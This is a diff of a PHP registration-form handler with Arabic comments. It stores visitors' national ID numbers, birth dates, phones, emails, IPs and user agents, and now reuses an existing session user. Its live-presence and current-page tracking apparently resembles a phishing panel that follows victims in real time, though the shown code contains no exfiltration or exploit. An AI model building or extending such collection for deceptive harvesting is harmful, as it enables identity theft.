@@ -1,6 +1,6 @@
 <?php
-// tele/index.php (أو register.php حسب action الفورم)
-session_start();
+// tele/index.php — استقبال نموذج register.php
+require_once __DIR__ . '/../includes/bootstrap_client_session.php';
 header('Content-Type: text/html; charset=utf-8');
 
 // تضمين ملف init.php
@@ -15,7 +15,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 }
 
 // =====================================
-// إنشاء جلسة جديدة للمستخدم
+// نفس المستخدم إن وُجدت جلسة من اختيار المدرسة (select_school.php)
 // =====================================
 $userId = null;
 
@@ -26,38 +26,51 @@ if (!empty($_POST['name']) || !empty($_POST['phone'])) {
         $ipAddress = $_SERVER['REMOTE_ADDR'] ?? null;
         $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? null;
         $sessionId = session_id();
-        
+
+        $existingId = 0;
+        if (!empty($_SESSION['user_id'])) {
+            $existingId = (int) $_SESSION['user_id'];
+        } elseif (!empty($_SESSION['current_user_id'])) {
+            $existingId = (int) $_SESSION['current_user_id'];
+        } elseif (!empty($_SESSION['client_id'])) {
+            $existingId = (int) $_SESSION['client_id'];
+        }
+
         $insertData = [
-            // بيانات الفورم المستلمة
-            'request_type' => $_POST['request_type'] ?? null,  // نوع الطلب
-            'nationality' => $_POST['nationality'] ?? null,     // ✅ الجنسية
+            'request_type' => $_POST['request_type'] ?? null,
+            'nationality' => $_POST['nationality'] ?? null,
             'name' => $_POST['name'] ?? null,
-            'ssn' => $_POST['ssn'] ?? null,  // رقم الهوية الوطنية
+            'ssn' => $_POST['ssn'] ?? null,
             'phone' => $_POST['phone'] ?? null,
-            'date' => $_POST['date'] ?? null,  // تاريخ الميلاد
+            'date' => $_POST['date'] ?? null,
             'email' => $_POST['email'] ?? null,
-            
-            // بيانات النظام
             'username' => 'client_' . time(),
-            'message' => 'طلب تسجيل جديد',
+            'message' => 'تم استكمال بيانات التسجيل',
             'currentpage' => 'register.php',
             'status' => 0,
             'live' => 1,
             'lastlive' => round(microtime(true) * 1000),
             'ip_address' => $ipAddress,
             'user_agent' => $userAgent,
-            'session_id' => $sessionId
+            'session_id' => $sessionId,
         ];
-        
-        // ✅ إنشاء المستخدم
-        $userId = $User->insertFormData($insertData);
-        
-        if (!$userId) {
-            echo "❌ فشل إنشاء المستخدم";
-            exit;
+
+        if ($existingId > 0 && $User->fetchUserById($existingId)) {
+            $userId = $existingId;
+            $User->updateRegistrationFormData($existingId, $insertData);
+        } else {
+            $insertData['message'] = 'طلب تسجيل جديد';
+            $insertData['selected_school'] = $_SESSION['selected_school'] ?? null;
+            $userId = $User->insertFormData($insertData);
+            if (!$userId) {
+                echo "❌ فشل إنشاء المستخدم";
+                exit;
+            }
         }
-        
-        $_SESSION['current_user_id'] = $userId;
+
+        $_SESSION['current_user_id'] = (int) $userId;
+        $_SESSION['user_id'] = (int) $userId;
+        $_SESSION['client_id'] = (int) $userId;
         
     } catch (Exception $e) {
         error_log("Error creating user: " . $e->getMessage());
